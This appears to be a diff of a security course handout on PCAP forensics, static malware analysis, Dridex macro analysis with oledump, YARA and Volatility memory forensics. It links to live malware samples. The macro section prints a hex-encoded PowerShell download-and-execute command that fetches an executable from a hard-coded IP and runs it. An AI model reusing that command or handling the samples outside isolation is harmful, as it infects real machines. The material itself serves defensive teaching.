+for i in session_00[0-9]*.www.html; do srcip=`cat "$i" | grep 'www:\ ' | awk '{print $2}' |  cut -d ':' -f1`; dstip=`cat "$i" | grep 'www:\ ' | awk '{print $4}' |  cut -d ':' -f1`; host=`cat "$i" | grep 'Host:\ ' | sort -u | sed -e 's/Host:\ //g'`; echo "$srcip --> $dstip = $host";  done | sort -u
+
+
+
+
+
+#############################
+# PCAP Analysis with tshark #
+#############################
+tshark -r suspicious-time.pcap | grep 'NB.*20\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+
+
+tshark -r suspicious-time.pcap | grep 'NB.*1e\>' | sed -e 's/<[^>]*>//g' | awk '{print $3,$4,$9}' | sort -u
+
+
+tshark -r suspicious-time.pcap arp | grep has | awk '{print $3," -> ",$9}' | tr -d '?'
+
+
+tshark –r suspicious-time.pcap -Tfields -e “eth.src” | sort | uniq
+
+
+tshark -r suspicious-time.pcap -R "browser.command==1" -Tfields -e "ip.src" -e "browser.server" | uniq
+
+tshark -r suspicious-time.pcap -Tfields -e "eth.src" | sort |uniq
+
+tshark -r suspicious-time.pcap -qz ip_hosts,tree
+
+tshark -r suspicious-time.pcap -R "http.request" -Tfields -e "ip.src" -e "http.user_agent" | uniq
+
+tshark -r suspicious-time.pcap -R "dns" -T fields -e "ip.src" -e "dns.flags.response" -e "dns.qry.name"
+
+
+whois rapidshare.com.eyu32.ru
+
+whois sploitme.com.cn
+
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' 
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico' -e google -e 'honeynet.org'
+
+tshark -r suspicious-time.pcap -qz http_req,tree
+
+tshark -r suspicious-time.pcap -R "data-text-lines contains \"<script\"" -T fields -e frame.number -e ip.src -e ip.dst
+
+tshark -r suspicious-time.pcap -R http.request  -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri | awk '{print $1," -> ",$2, "\t: ","http://"$3$4}' | grep -v -e '\/image' -e '.css' -e '.ico'  | grep 10.0.3.15 | sed -e 's/\?[^cse].*/\?\.\.\./g'
+
+
+
+######################################
+# PCAP Analysis with forensicPCAP.py #
+######################################
+cd ~/Desktop
+wget https://raw.githubusercontent.com/madpowah/ForensicPCAP/master/forensicPCAP.py
+sudo easy_install cmd2
+
+python forensicPCAP.py Browser\ Forensics/suspicious-time.pcap
+
+ForPCAP >>> help
+
+
+Prints stats about PCAP
+ForPCAP >>> stat
+
+
+Prints all DNS requests from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dns
+
+ForPCAP >>> show
+
+
+Prints all destination ports from the PCAP file. The id before the DNS is the packet's id which can be use with the "show" command.
+ForPCAP >>> dstports
+
+ForPCAP >>> show
+
+
+Prints the number of ip source and store them.
+ForPCAP >>> ipsrc
+
+
+Prints the number of web's requests and store them
+ForPCAP >>> web
+
+
+Prints the number of mail's requests and store them
+ForPCAP >>> mail
+
+
+
+
+
+############################
+#  Day 3: Malware Analysis #
+############################
+
+
+############################
+# Download the Analysis VM #
+############################
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
+user: malware
+pass: malware
+
+
+- Log in to your Ubuntu system with the username 'malware' and the password 'malware'.
+
+- After logging please open a terminal window and type the following commands:
+
+cd Desktop/
+
+
+- This is actual Malware (remmeber to run it in a VM - the password to extract it is 'infected':
+
+wget https://s3.amazonaws.com/StrategicSec-Files/MalwareAnalysis/malware-password-is-infected.zip
+wget https://s3.amazonaws.com/StrategicSec-Files/analyse_malware.py
+
+unzip malware-password-is-infected.zip
+	infected
+
+file malware.exe
+
+mv malware.exe malware.pdf
+
+file malware.pdf
+
+mv malware.pdf malware.exe
+ 
+hexdump -n 2 -C malware.exe
+ 
+***What is '4d 5a' or 'MZ'***
+Reference: 
+http://www.garykessler.net/library/file_sigs.html
+ 
+
+objdump -x malware.exe
+ 
+strings malware.exe
+
+strings --all malware.exe | head -n 6
+ 
+strings malware.exe | grep -i dll
+ 
+strings malware.exe | grep -i library
+
+strings malware.exe | grep -i reg
+
+strings malware.exe | grep -i hkey
+
+strings malware.exe | grep -i hku
+
+							- We didn't see anything like HKLM, HKCU or other registry type stuff
+
+strings malware.exe | grep -i irc
+
+strings malware.exe | grep -i join			
+
+strings malware.exe | grep -i admin
+
+strings malware.exe | grep -i list
+
+
+							- List of IRC commands: https://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands
+
+sudo apt-get install -y python-pefile
+
+vi analyse_malware.py
+
+python analyse_malware.py malware.exe
+
+
+
+
+Building a Malware Scanner
+--------------------------
+
+mkdir ~/Desktop/malwarescanner
+
+cd ~/Desktop/malwarescanner
+
+wget https://github.com/jonahbaron/malwarescanner/archive/master.zip
+
+unzip master.zip
+
+cd malwarescanner-master/
+
+python scanner.py -h
+
+cat strings.txt
+
+cat hashes.txt
+
+mkdir ~/Desktop/malcode
+
+cp ~/Desktop/malware.exe ~/Desktop/malcode
+
+python scanner.py -H hashes.txt -D /home/malware/Desktop/malcode/ strings.txt
+
+cp ~/Desktop/
+
+
+
+#####################################################
+# Analyzing Macro Embedded Malware                  #
+# Reference:                                        #
+# https://jon.glass/analyzes-dridex-malware-p1/     #
+#####################################################
+cp ~/Desktop/
+
+- Create a FREE account on:
+https://malwr.com/account/signup/
+
+- Grab the malware from:
+https://malwr.com/analysis/MzkzMTk3MzBlZGQ2NDRhY2IyNTc0MGI5MWQwNzEwZmQ/
+
+file ~/Downloads/f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin
+
+cat ~/Downloads/f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin
+
+
+
+
+sudo pip install olefile
+
+mkdir ~/Desktop/oledump
+
+cd ~/Desktop/oledump
+
+wget http://didierstevens.com/files/software/oledump_V0_0_22.zip
+
+unzip oledump_V0_0_22.zip
+
+cp ~/Downloads/f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin .
+
+mv f9b874f9ccf803abaeaaf7af93523ee140f1929837f267378c89ed7b5bf174bf.bin 064016.doc
+
+python oledump.py 064016.doc
+
+python oledump.py 064016.doc -s A4 -v
+
+- From this we can see this Word doc contains an embedded file called editdata.mso which contains seven data streams. 
+- Three of the data streams are flagged as macros: A3:’VBA/Module1′, A4:’VBA/Module2′, A5:’VBA/ThisDocument’. 
+
+
+python oledump.py 064016.doc -s A5 -v
+
+- As far as I can tell, VBA/Module2 does absolutely nothing. These are nonsensical functions designed to confuse heuristic scanners.
+
+
+python oledump.py 064016.doc -s A3 -v
+
+- Look for "GVhkjbjv" and you should see: 
+
+636D64202F4B20706F7765727368656C6C2E657865202D457865637574696F6E506F6C69637920627970617373202D6E6F70726F66696C6520284E65772D4F626A6563742053797374656D2E4E65742E576562436C69656E74292E446F776E6C6F616446696C652827687474703A2F2F36322E37362E34312E31352F6173616C742F617373612E657865272C272554454D50255C4A494F696F646668696F49482E63616227293B20657870616E64202554454D50255C4A494F696F646668696F49482E636162202554454D50255C4A494F696F646668696F49482E6578653B207374617274202554454D50255C4A494F696F646668696F49482E6578653B
+
+- Take that long blob that starts with 636D and finishes with 653B and paste it in:
+http://www.rapidtables.com/convert/number/hex-to-ascii.htm
+
+
+
+
+##############
+# Yara Ninja #
+##############
+sudo apt-get remove -y yara
+
+wget https://github.com/plusvic/yara/archive/v3.4.0.zip
+
+sudo apt-get -y install libtool
+
+unzip v3.4.0.zip
+
+cd yara-3.4.0
+
+./bootstrap.sh
+
+./configure
+
+make
+
+sudo make install
+
+yara -v
+
+cd ..
+
+wget https://github.com/Yara-Rules/rules/archive/master.zip
+
+unzip master.zip
+
+cd ~/Desktop
+
+yara rules-master/packer.yar malcode/malware.exe
+
+
+Places to get more Yara rules:
+------------------------------
+https://malwareconfig.com/static/yaraRules/
+https://github.com/kevthehermit/YaraRules
+https://github.com/VectraThreatLab/reyara
+
+
+
+Yara rule sorting script:
+-------------------------
+https://github.com/mkayoh/yarasorter
+
+
+
+cd ~/Desktop/rules-master
+for i in $( ls --hide=master.yar ); do echo include \"$i\";done > master.yar
+cd ~/Desktop/
+yara rules-master/master.yar malcode/malware.exe
+
+
+
+
+
+
+
+
+
+
+Here is a 2 million sample malware DB created by Derek Morton that you can use to start your DB with:
+http://derekmorton.name/files/malware_12-14-12.sql.bz2
+
+
+Malware Repositories:
+http://malshare.com/index.php
+http://www.malwareblacklist.com/
+http://www.virusign.com/
+http://virusshare.com/
+http://www.tekdefense.com/downloads/malware-samples/
+
+
+
+
+###############################
+# Creating a Malware Database #
+###############################
+
+Creating a malware database (sqlite)
+------------------------------------
+sudo apt-get install -y python-simplejson python-simplejson-dbg
+wget https://malwarecookbook.googlecode.com/svn/trunk/4/4/avsubmit.py
+wget https://s3.amazonaws.com/StrategicSec-Files/MalwareAnalysis/malware-password-is-infected.zip
+unzip malware-password-is-infected.zip
+	infected
+python avsubmit.py --init
+python avsubmit.py -f malware.exe -e
+
+
+
+
+
+Creating a malware database (mysql)
+-----------------------------------
+- Step 1: Installing MySQL database
+- Run the following command in the terminal:
+
+sudo apt-get install mysql-server
+	 
+- Step 2: Installing Python MySQLdb module
+- Run the following command in the terminal:
+
+sudo apt-get build-dep python-mysqldb
+sudo apt-get install python-mysqldb
+
+Step 3: Logging in 
+Run the following command in the terminal:
+
+mysql -u root -p					(set a password of 'malware')
+
+- Then create one database by running following command:
+
+create database malware;
+
+exit;
+
+wget https://raw.githubusercontent.com/dcmorton/MalwareTools/master/mal_to_db.py
+
+vi mal_to_db.py						(fill in database connection information)
+
+python mal_to_db.py -i
+
+python mal_to_db.py -f malware.exe -u
+
+
+mysql -u root -p
+	malware
+
+mysql> use malware;
+
+select id,md5,sha1,sha256,time FROM files;
+
+mysql> quit;
+
+
+
+
+
+
+
+
+
+###################
+# Memory Analysis #
+###################
+cd /home/malware/Desktop/Banking\ Troubles/Volatility
+
+python volatility
+python volatility pslist -f ../hn_forensics.vmem
+python volatility connscan2 -f ../hn_forensics.vmem
+python volatility memdmp -p 888 -f ../hn_forensics.vmem
+python volatility memdmp -p 1752 -f ../hn_forensics.vmem
+				***Takes a few min***
+strings 1752.dmp | grep "^http://" | sort | uniq
+strings 1752.dmp | grep "Ahttps://" | uniq -u
+cd ..
+foremost -i ../Volatility/1752.dmp -t pdf -o output/pdf2
+cd /home/malware/Desktop/Banking\ Troubles/foremost-1.5.7/output/pdf2/
+cat audit.txt
+cd pdf
+ls
+grep -i javascript *.pdf
+
+
+
+cd /home/malware/Desktop/Banking\ Troubles/foremost-1.5.7/output/pdf5/pdf
+wget http://didierstevens.com/files/software/pdf-parser_V0_6_4.zip
+unzip pdf-parser_V0_6_4.zip
+python pdf-parser.py -s javascript --raw 00600328.pdf
+python pdf-parser.py --object 11 00600328.pdf
+python pdf-parser.py --object 1054 --raw --filter 00600328.pdf > malicious.js
+
+cat malicious.js
+
+
+*****Sorry - no time to cover javascript de-obfuscation today*****
+
+
+cd /home/malware/Desktop/Banking\ Troubles/Volatility/
+python volatility files -f ../hn_forensics.vmem > files
+cat files | less
+python volatility malfind -f ../hn_forensics.vmem -d out
+ls out/
+python volatility hivescan -f ../hn_forensics.vmem									
+python volatility printkey -o 0xe1526748 -f ../hn_forensics.vmem Microsoft "Windows NT" CurrentVersion Winlogon	
+for file in $(ls *.dmp); do echo $file; strings $file | grep bankofamerica; done
